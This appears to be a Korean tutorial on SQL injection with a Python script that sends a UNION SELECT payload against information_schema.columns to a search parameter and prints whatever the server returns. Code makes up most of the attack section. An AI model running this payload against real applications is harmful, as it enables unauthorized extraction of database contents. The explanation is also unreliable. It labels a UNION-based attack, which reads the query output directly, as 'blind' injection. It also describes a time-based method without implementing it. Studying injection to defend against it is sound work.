# Python을 사용한 Blind SQL Injection

## 소개
Blind SQL Injection은 웹 애플리케이션에서 발생할 수 있는 보안 취약점 중 하나로, 공격자가 애플리케이션의 데이터베이스를 조작할 수 있는 기술입니다. 이 기술은 SQL 쿼리의 결과에 따라 서버의 응답을 확인함으로써 데이터베이스의 정보를 추출하거나 조작할 수 있습니다. 이 예제는 Python을 사용하여 Blind SQL Injection을 시연하고 설명합니다.

## 필수 요소
- **Python 3.x**: Python 코드를 실행하기 위한 환경이 필요합니다.
- **requests 라이브러리**: HTTP 요청을 보내기 위한 라이브러리입니다.

## 시나리오
이 예제에서는 다음과 같은 가정을 합니다:
- 공격 대상: 웹 애플리케이션의 검색 기능
- 공격 목표: 데이터베이스의 정보를 추출

## 공격 과정
1. **Union Based Blind SQL Injection**: 검색 기능을 통해 SQL Injection을 발생시키고 Union 구문을 사용하여 데이터베이스 정보를 추출합니다.
2. **Time Based Blind SQL Injection**: 시간 지연 함수 (예: `sleep()`)를 이용하여, 결과에 따라 서버의 응답 속도를 확인하고 데이터베이스의 정보를 추정합니다.

## Python 코드 예제
아래 예제 코드는 Python을 사용하여 Union Based Blind SQL Injection을 시연하는 예제입니다. 이 코드는 실제 공격을 목적으로 하지 않으며, 학습과 이해를 위한 목적으로 제공됩니다.

```python
import requests

# 타겟 웹 애플리케이션 URL
target_url = 'http://example.com/search'

# Union Based Blind SQL Injection
def blind_sql_injection():
    result = ""
    # 데이터베이스의 정보를 추출할 SQL Injection Payload
    payload = "' UNION SELECT table_name, column_name FROM information_schema.columns -- "
    
    # HTTP 요청을 보내서 취약점을 이용한 데이터 추출 시도
    try:
        response = requests.get(target_url, params={'search': payload})
        if response.status_code == 200:
            # 취약점을 이용하여 얻은 데이터 출력
            result = response.text
    except requests.RequestException as e:
        print(f"에러 발생: {e}")
    
    return result

# 메인 함수: Blind SQL Injection 실행 및 결과 출력
def main():
    print("Python을 사용한 Blind SQL Injection 예제\n")
    print("데이터베이스 정보를 추출하는 중...\n")
    
    # Blind SQL Injection 시도
    extracted_data = blind_sql_injection()
    
    if extracted_data:
        print("추출된 데이터:")
        print(extracted_data)
    else:
        print("데이터 추출 실패. 애플리케이션이 취약하지 않을 수 있습니다.")

if __name__ == "__main__":
    main()
